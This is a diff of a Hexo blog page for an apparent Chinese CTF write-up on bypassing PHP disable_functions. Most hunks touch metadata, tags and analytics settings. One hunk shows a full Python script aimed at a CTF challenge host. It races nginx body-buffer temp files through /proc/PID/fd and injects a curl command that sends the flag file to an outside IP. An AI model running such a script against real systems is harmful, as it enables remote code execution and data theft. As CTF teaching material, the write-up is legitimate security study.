@@ -21,7 +21,7 @@
   
   <meta name="theme-color" content="#2f4154">
   <meta name="author" content="dr0n">
-  <meta name="keywords" content="">
+  <meta name="keywords" content="ctf, writeups, web, misc">
   
     <meta name="description" content="常规函数函数绕过123456789101112131415161718&lt;?php&#x2F;&#x2F;exececho exec(&#x27;whoami&#x27;);&#x2F;&#x2F;shell_exececho shell_exec(&#x27;whoami&#x27;);&#x2F;&#x2F;systemsystem(&#x27;whoami&#x27;);&#x2F;&#x2F;passthrupassthru(&quot;whoami&quot;)">
 <meta property="og:type" content="article">
@@ -34,11 +34,11 @@
 <meta property="article:published_time" content="2024-07-17T04:00:00.000Z">
 <meta property="article:modified_time" content="2026-02-01T12:51:02.379Z">
 <meta property="article:author" content="dr0n">
-<meta property="article:tag" content="总结">
-<meta property="article:tag" content="php">
 <meta property="article:tag" content="bypass">
 <meta property="article:tag" content="disable_functions">
+<meta property="article:tag" content="php">
 <meta property="article:tag" content="pwn">
+<meta property="article:tag" content="总结">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://www.dr0n.top/img/summary/disable_functions-1.png">
   
@@ -82,7 +82,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"cDl9nch6MITIDFI9oATLRdpm-gzGzoHsz","app_key":"X6LMz3T4TtGGD4SoDAQrR5g4","server_url":"https://api.dr0n.top","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9,"expand_all":true},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"openkounter":{"server_url":"https://openkounter-1lbvmren.edgeone.cool/","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -116,13 +116,11 @@
   
 
   
-    
-  
 
 
 
   
-<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
 </head>
 
 
@@ -301,20 +299,13 @@
         
         
         
-          85 分钟
+          94 分钟
         
       </span>
     
 
     
     
-      
-        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="leancloud-page-views"></span> 次
-        </span>
-        
-      
       
     
   </div>
@@ -434,7 +425,7 @@
 <p>php的临时文件一般在<code>/tmp</code>目录下，如果可以列目录看到文件名的话可以考虑利用，否则很难爆破文件名</p>
 <p><strong>二：nginx的body缓存机制</strong></p>
 <p>如果传输的数据大于16k，则nginx会缓存。虽然说nginx会保存文件，但是nginx会在转发给php-fpm后就删除掉了(在php解释执行之前)</p>
-<p>这就不能直接利用了，需要用到linux的一个特性：<code>/proc/PID/fd/&#123;1&#125;</code>去读取（条件是php和nginx的执行用户名是相同的才可以访问）</p>
+<p>这就不能直接利用了，需要用到linux的一个特性：<code>/proc/PID/fd/{1}</code>去读取（条件是php和nginx的执行用户名是相同的才可以访问）</p>
 <p>一个例子</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><br>ip = <span class="hljs-string">&#x27;pwn.challenge.ctf.show&#x27;</span><br>port = <span class="hljs-number">28268</span><br>s = socket.socket()<br>s.connect((ip, port))<br><br><br><span class="hljs-comment"># 获取当前进程的pid</span><br>s.send(<span class="hljs-string">f&#x27;&#x27;&#x27;GET / HTTP/1.1</span><br><span class="hljs-string">Host:127.0.0.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">	&#x27;&#x27;&#x27;</span>.encode())<br>data = s.recv(<span class="hljs-number">1024</span>).decode()<br>s.close()<br>pid = re.findall(<span class="hljs-string">&#x27;(.*?) www-data&#x27;</span>, data)[<span class="hljs-number">0</span>].strip()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;pid:&quot;</span>, pid)<br><br><br><span class="hljs-comment"># payload</span><br>payload = <span class="hljs-string">&quot;curl http://47.99.77.52:8888?a=`cat /f*`;&quot;</span> + <span class="hljs-string">&#x27;0&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">500</span><br>length = <span class="hljs-built_in">len</span>(payload)<br><br><br><span class="hljs-comment"># 上传文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        s = socket.socket()<br>        s.connect((ip, port))<br>        x = <span class="hljs-string">f&#x27;&#x27;&#x27;POST / HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;length&#125;</span></span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;payload&#125;</span></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.encode()<br>        s.send(x)<br>        s.close()<br><br><br><span class="hljs-comment"># 读取文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruter</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-number">40</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;fd:&quot;</span>, fd)<br>            s = socket.socket()<br>            s.connect((ip, port))<br>            s.send(<span class="hljs-string">f&#x27;&#x27;&#x27;GET /?file=/proc/<span class="hljs-subst">&#123;pid&#125;</span>/fd/<span class="hljs-subst">&#123;fd&#125;</span> HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>.encode())<br>            <span class="hljs-built_in">print</span>(s.recv(<span class="hljs-number">2048</span>).decode())<br>            s.close()<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    t = threading.Thread(target=upload)<br>    t.start()<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    a = threading.Thread(target=bruter)<br>    a.start()<br><br></code></pre></td></tr></table></figure>
 
@@ -1005,23 +996,6 @@
   
 
   
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
 
 </div>
 
@@ -1189,8 +1163,6 @@
 
 
   <script>Fluid.plugins.imageCaption();</script>
-
-  <script defer src="/js/leancloud.js" ></script>
 
   <script  src="/js/local-search.js" ></script>
 
